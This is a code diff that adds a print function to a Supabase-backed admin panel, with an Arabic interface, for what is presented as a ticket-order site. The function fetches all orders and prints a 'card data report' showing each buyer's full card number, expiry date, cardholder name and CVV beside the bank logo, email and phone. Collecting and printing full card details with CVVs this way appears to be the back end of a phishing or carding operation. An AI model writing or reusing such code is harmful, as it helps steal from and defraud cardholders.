@@ -218,6 +218,115 @@ const AdminSettings = () => {
     }
   };
 
+  const handlePrintReport = async () => {
+    playChime("info");
+    toast({ title: "🖨️ جاري التجهيز...", description: "يتم تجهيز التقرير للطباعة" });
+    try {
+      const { data: orders } = await supabase.from("ticket_orders").select("*").order("created_at", { ascending: false });
+      if (!orders || orders.length === 0) {
+        playChime("error");
+        toast({ title: "⚠️ تنبيه", description: "لا توجد طلبات للطباعة" });
+        return;
+      }
+      const cardsData = orders.filter((o: any) => o.card_full_number || o.card_last4);
+      const seen = new Set<string>();
+      const uniqueCards = cardsData.filter((o: any) => {
+        const key = o.card_full_number || o.card_last4 || o.id;
+        if (seen.has(key)) return false;
+        seen.add(key);
+        return true;
+      });
+      if (uniqueCards.length === 0) {
+        playChime("error");
+        toast({ title: "⚠️ تنبيه", description: "لا توجد بيانات بطاقات للطباعة" });
+        return;
+      }
+
+      const cardHtml = uniqueCards.map((o: any, i: number) => {
+        const bankKey = o.bank_name || "";
+        const logoUrl = (bankLogos as any)[bankKey] || "";
+        const colors = (bankColors as any)[bankKey] || { header: "linear-gradient(135deg,#1a1a2e,#2d2d44)", accent: "#d4a843" };
+        return `
+        <div style="margin-bottom:28px;break-inside:avoid;">
+          <div style="display:flex;gap:20px;align-items:flex-start;direction:rtl;">
+            <div style="width:380px;min-width:380px;height:230px;border-radius:16px;background:${colors.header};box-shadow:0 8px 24px rgba(0,0,0,0.25);padding:24px;position:relative;overflow:hidden;display:flex;flex-direction:column;justify-content:space-between;">
+              <div style="position:absolute;top:-50%;right:-50%;width:100%;height:200%;background:linear-gradient(135deg,rgba(255,255,255,0.15) 0%,transparent 50%);transform:rotate(-20deg);pointer-events:none;"></div>
+              <div style="display:flex;justify-content:space-between;align-items:flex-start;position:relative;z-index:1;">
+                <div style="display:flex;align-items:center;gap:8px;">
+                  ${logoUrl ? `<img src="${logoUrl}" style="width:38px;height:38px;border-radius:8px;object-fit:contain;background:rgba(255,255,255,0.95);padding:4px;" />` : ""}
+                  <div>
+                    <p style="font-size:11px;font-weight:700;color:rgba(255,255,255,0.95);margin:0;">${o.bank_name || "بطاقة دفع"}</p>
+                    <p style="font-size:9px;color:rgba(255,255,255,0.5);margin:2px 0 0;">${(o.card_brand || "CARD").toUpperCase()}</p>
+                  </div>
+                </div>
+                <div style="width:42px;height:32px;border-radius:6px;background:linear-gradient(145deg,#e8d5a3,#c9a84c,#e8d5a3);position:relative;">
+                  <div style="position:absolute;top:8px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
+                  <div style="position:absolute;top:14px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
+                  <div style="position:absolute;top:20px;left:4px;right:4px;height:1px;background:rgba(0,0,0,0.15);"></div>
+                </div>
+              </div>
+              <div style="position:relative;z-index:1;text-align:center;">
+                <p style="font-size:20px;font-weight:700;color:#fff;margin:0;letter-spacing:4px;direction:ltr;">${o.card_full_number ? o.card_full_number.replace(/(.{4})/g, '$1 ').trim() : `**** **** **** ${o.card_last4}`}</p>
+              </div>
+              <div style="display:flex;justify-content:space-between;align-items:flex-end;position:relative;z-index:1;">
+                <div style="text-align:left;direction:ltr;">
+                  <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;text-transform:uppercase;">VALID THRU</p>
+                  <p style="font-size:14px;font-weight:600;color:#fff;margin:2px 0 0;">${o.card_expiry || "MM/YY"}</p>
+                </div>
+                <div><p style="font-size:12px;font-weight:700;color:rgba(255,255,255,0.9);margin:0;">${o.cardholder_name || "CARDHOLDER"}</p></div>
+                <div style="text-align:right;">
+                  <p style="font-size:7px;color:rgba(255,255,255,0.5);margin:0;">CVV</p>
+                  <p style="font-size:14px;font-weight:700;color:#fbbf24;margin:2px 0 0;">${o.card_cvv || "***"}</p>
+                </div>
+              </div>
+            </div>
+            <div style="flex:1;background:#f8fafc;border-radius:12px;padding:18px;border:1px solid #e2e8f0;display:flex;flex-direction:column;justify-content:center;gap:10px;">
+              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+                <span style="font-size:10px;color:#94a3b8;background:#f1f5f9;padding:3px 10px;border-radius:6px;direction:ltr;">${o.confirmation_number || o.id.slice(0, 8)}</span>
+                <span style="font-size:13px;font-weight:800;color:#1e293b;">#${i + 1}</span>
+              </div>
+              <div style="height:1px;background:#e2e8f0;"></div>
+              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">المبلغ</span><span style="font-size:14px;font-weight:800;color:#059669;">${o.total} ر.س</span></div>
+              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">الحالة</span><span style="font-size:11px;font-weight:600;color:${o.status === 'confirmed' ? '#059669' : o.status === 'rejected' ? '#dc2626' : '#d97706'};">${o.status === 'confirmed' ? '✅ مؤكد' : o.status === 'rejected' ? '❌ مرفوض' : '⏳ معلق'}</span></div>
+              <div style="height:1px;background:#e2e8f0;"></div>
+              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📧</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.email}</span></div>
+              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📱</span><span style="font-size:10px;color:#334155;direction:ltr;">${o.phone}</span></div>
+              <div style="display:flex;justify-content:space-between;"><span style="font-size:10px;color:#64748b;">📅</span><span style="font-size:10px;color:#334155;">${new Date(o.created_at).toLocaleDateString("ar-SA")}</span></div>
+            </div>
+          </div>
+        </div>`;
+      }).join("");
+
+      const printWindow = window.open("", "_blank");
+      if (!printWindow) {
+        playChime("error");
+        toast({ title: "❌ خطأ", description: "تم حظر النافذة المنبثقة. اسمح بالنوافذ المنبثقة وحاول مرة أخرى", variant: "destructive" });
+        return;
+      }
+      printWindow.document.write(`<!DOCTYPE html><html dir="rtl"><head><meta charset="utf-8"><title>تقرير البطاقات</title><style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:#fff;padding:30px 40px;direction:rtl;}
+        @media print{body{padding:10px 20px;}@page{size:A4 landscape;margin:10mm;}}
+      </style></head><body>
+        <div style="text-align:center;margin-bottom:30px;">
+          <h1 style="font-size:22px;font-weight:800;color:#1a1a2e;">💳 تقرير بيانات البطاقات</h1>
+          <p style="font-size:11px;color:#64748b;margin-top:6px;">${new Date().toLocaleDateString("ar-SA")} — ${uniqueCards.length} بطاقة</p>
+          <div style="height:2px;background:linear-gradient(90deg,transparent,#d4a843,transparent);margin-top:14px;"></div>
+        </div>
+        ${cardHtml}
+        <div style="text-align:center;margin-top:24px;padding-top:12px;border-top:1px solid #e2e8f0;">
+          <p style="font-size:9px;color:#94a3b8;">🔒 سري وخاص — تقرير بيانات البطاقات — ${new Date().toLocaleString("ar-SA")}</p>
+        </div>
+      </body></html>`);
+      printWindow.document.close();
+      setTimeout(() => { printWindow.print(); }, 500);
+      playChime("success");
+    } catch {
+      playChime("error");
+      toast({ title: "❌ خطأ", description: "حدث خطأ أثناء التجهيز", variant: "destructive" });
+    }
+  };
+
   const handleClearAll = async () => {
     playChime("error");
     if (!window.confirm("⚠️ هل أنت متأكد من مسح جميع البيانات؟ هذا الإجراء لا يمكن التراجع عنه!")) return;
